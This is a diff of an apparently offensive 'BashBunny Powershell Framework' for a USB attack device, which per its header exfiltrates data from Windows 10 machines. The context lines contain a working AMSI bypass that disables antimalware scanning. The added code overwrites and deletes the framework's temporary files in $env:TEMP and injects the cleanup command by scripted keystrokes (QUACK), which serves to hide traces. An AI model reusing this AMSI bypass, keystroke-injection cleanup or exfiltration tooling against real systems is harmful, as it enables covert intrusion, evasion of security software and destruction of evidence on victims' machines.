@@ -7,7 +7,7 @@
 # 				 Exfiltrates through either Ethernet (using sockets) or mass storage onto the Bashbunny
 # Author:        p3rki3
 # Props:		 Dominic Chell (MDSec) for the AMSI bypass.  Other bypasses exist and your mileage may vary - if in doubt, inject your own
-# Version:       0.91
+# Version:       0.92
 # Category:		 extension
 # Target:		 Windows 10 (Powershell) - untested with earlier versions of windows
 # Dependencies:  gohttp
@@ -23,7 +23,7 @@
 #   Multicolour	Blink 		Framework closing down normally
 ####################################################################################################################
 
-BBPS_VERSION = "0.91"
+BBPS_VERSION = "0.92"
 
 ######## FUNCTIONS ########
 # This function is called when the framework hits a fatal error - it writes a failure message to fail.dbg on the bashbunny 
@@ -425,19 +425,47 @@ PS > Use-BBFwork "NET" "switch1" "QUIET"
     [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic, Static").SetValue($null,$a)
     ([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").GetValue($null)) | out-null
     if ($global:QUIET -ne "QUIET") {
-        echo "BashBunny Powershell Framework v0.9 loaded!"
+        echo "BashBunny Powershell Framework v0.92 loaded!"
     }
 }
+
+########################## Performs some setup for BB Powershell Framework #########################################
+function Clear-BBPSTempFile
+{
+<#
+.SYNOPSIS
+Overwrites and then deletes a temporary file
+
+.DESCRIPTION
+Overwrites and then deletes a temporary file created by the framework in $env:TEMP
+
+.EXAMPLE
+PS > Clear-BBPSTempFile "tempfilename.txt"
+
+.LINK
+#>
+
+    [CmdletBinding()] Param( 
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $TEMPFILE
+    )
+    echo "" > $env:TEMP\$TEMPFILE
+    Remove-Item $env:TEMP\$TEMPFILE
+}
+Set-Alias -Name bbdelfile Clear-BBPSTempFile
+
 
 ########################## Performs some setup for BB Powershell Framework #########################################
 function Invoke-BBCleanup
 {
 <#
 .SYNOPSIS
-Cleans up powershell and exists BB PS Framework
+Cleans up powershell and exits BB PS Framework
 
 .DESCRIPTION
-Cleans up powershell and exists BB PS Framework
+Cleans up powershell and exits BB PS Framework
+Removes any temporary files in the windows $env:TEMP directory
 Ejects the bashbunny if it was mounted as storage, and exits powershell if required
 
 .EXAMPLE
@@ -464,6 +492,10 @@ PS > Invoke-BBCleanup "QUIET"
     if ($LOUDNESS -eq "VISIBLE") {
         exit 0
     }
+	Clear-BBPSTempFile tmp.txt
+	Clear-BBPSTempFile tmp.ps1
+	Clear-BBPSTempFile temp.txt
+	Clear-BBPSTempFile bbfwork.psm1
 }
 Set-Alias -Name bbcleanup Invoke-BBCleanup
 
@@ -652,3 +684,20 @@ print "[+] All done!"
 EOF
 }
 export -f create_receiver
+
+# Function to enable user payload to clean up any temporary files after itself on the powershell side
+function REMOVE_PSTEMPFILE() {
+    bbps_debug "Entering REMOVE_PSTEMPFILE"
+
+    while [ ! -z $1 ]
+    do
+        bbps_debug "Deleting file $1"
+        QUACK STRING Clear-BBPSTempFile $1
+        QUACK ENTER
+        sleep 0.1
+		shift
+    done
+
+    bbps_debug "Returning from REMOVE_PSTEMPFILE"
+}
+export -f REMOVE_PSTEMPFILE
